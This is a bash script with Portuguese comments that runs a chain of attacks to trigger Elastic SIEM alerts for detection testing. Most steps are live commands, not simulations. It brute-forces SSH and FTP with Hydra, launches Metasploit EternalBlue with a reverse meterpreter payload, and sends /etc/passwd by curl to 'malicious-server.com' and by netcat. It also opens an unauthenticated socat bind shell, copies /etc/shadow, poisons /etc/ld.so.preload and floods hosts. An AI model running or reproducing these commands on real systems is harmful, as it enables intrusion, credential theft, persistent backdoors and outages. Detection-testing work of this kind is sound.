#!/bin/bash

# Definição de Cores para Destacar no Terminal
RED='\033[0;31m'
GREEN='\033[0;32m'
NC='\033[0m' # Sem Cor

echo -e "${RED}Simulando múltiplos ataques para disparar alertas no Elastic SIEM... ${NC}"
sleep 2

# 1️Scan de Rede (Nmap + ARP-Scan)
echo -e "${GREEN}[+] Iniciando Scan de Rede com Nmap e ARP-Scan...${NC}"
nmap -sS -p 22,80,443 --script=vuln 195.168.1.0/24 &> /dev/null &
arp-scan -l &> /dev/null &
sleep 5

# 2️Brute-Force em SSH e FTP (Hydra)
echo -e "${GREEN}[+] Tentando brute-force em SSH e FTP com Hydra...${NC}"
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.100 -t 4 &> /dev/null &
hydra -l anonymous -P /usr/share/wordlists/rockyou.txt ftp://192.168.1.50 -t 4 &> /dev/null &
sleep 5

# 3️Escalada de Privilégio (Fake Log de Sudo Abuse)
echo -e "${GREEN}[+] Simulando escalada de privilégio com SUDO...${NC}"
echo "sudo -l" > /tmp/sudo_privilege.log
sleep 3

# 4️Mimikatz Fake Log (Dump de Credenciais)
echo -e "${GREEN}[+] Simulando ataque com Mimikatz...${NC}"
echo "mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" exit" > /tmp/mimikatz_fake.log
sleep 3

# 5️Exploração de SMB com Metasploit
echo -e "${GREEN}[+] Simulando exploração remota via Metasploit (EternalBlue)...${NC}"
msfconsole -q -x "use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS 192.168.1.50; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 192.168.1.200; run" &> /dev/null &
sleep 5

# 6️Exfiltração de Dados via Curl e Netcat
echo -e "${GREEN}[+] Simulando exfiltração de dados...${NC}"
curl -X POST -d @/etc/passwd http://malicious-server.com/upload &> /dev/null &
nc -w 3 192.168.1.200 4444 < /etc/passwd &> /dev/null &
sleep 5

# 7️Teste de Movimentação Lateral via SSH
echo -e "${GREEN}[+] Tentando conexão SSH suspeita...${NC}"
for i in {1..5}; do
  ssh root@192.168.1.100 -p 22 -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" -o "BatchMode=yes" exit &> /dev/null
  sleep 2
done

# 8️Simulação de Sniffing com Tcpdump
echo -e "${GREEN}[+] Capturando pacotes suspeitos com Tcpdump...${NC}"
tcpdump -i eth0 -c 50 &> /dev/null &
sleep 5

# 9️Teste de DDoS com Iperf e Ping Flood
echo -e "${GREEN}[+] Simulando ataque DDoS (Iperf e Ping Flood)...${NC}"
iperf -c 192.168.1.100 -u -b 100M &> /dev/null &
ping -f -c 1000 192.168.1.50 &> /dev/null &
sleep 5

# 10Tentativa de Acesso a Diretórios Sensíveis
echo -e "${GREEN}[+] Tentando acessar arquivos críticos do sistema...${NC}"
cat /etc/shadow &> /dev/null
ls -la /root/ &> /dev/null
sleep 5

# 1️1Captura de Senhas Wi-Fi (Fake)
echo -e "${GREEN}[+] Simulando captura de senhas Wi-Fi...${NC}"
aircrack-ng -a 2 -b 00:11:22:33:44:55 -w /usr/share/wordlists/rockyou.txt capture.cap &> /dev/null &
sleep 5

# 1️2Enumeração de Compartilhamentos SMB com Enum4Linux
echo -e "${GREEN}[+] Executando Enumeração de Compartilhamentos SMB...${NC}"
enum4linux -a 192.168.1.50 &> /dev/null &
sleep 5

# 1️3Persistência: Criando Backdoor com Socat
echo -e "${GREEN}[+] Criando persistência com Socat Backdoor...${NC}"
socat TCP4-LISTEN:9999 EXEC:/bin/bash &> /dev/null &
sleep 5

# 1️4Tentativa de Cópia de Credenciais
echo -e "${GREEN}[+] Copiando credenciais do sistema...${NC}"
cp /etc/passwd /tmp/credentials_backup &> /dev/null
cp /etc/shadow /tmp/shadow_backup &> /dev/null
sleep 5

# 1️5Tentativa de Rootkit (Simulação de Arquivo Suspeito)
echo -e "${GREEN}[+] Criando arquivo de rootkit falso...${NC}"
touch /etc/ld.so.preload
echo "/lib/evil.so" > /etc/ld.so.preload
sleep 5

# --- Finalização ---
echo -e "${RED} Teste finalizado! Verifique os alertas no Elastic SIEM.${NC}"
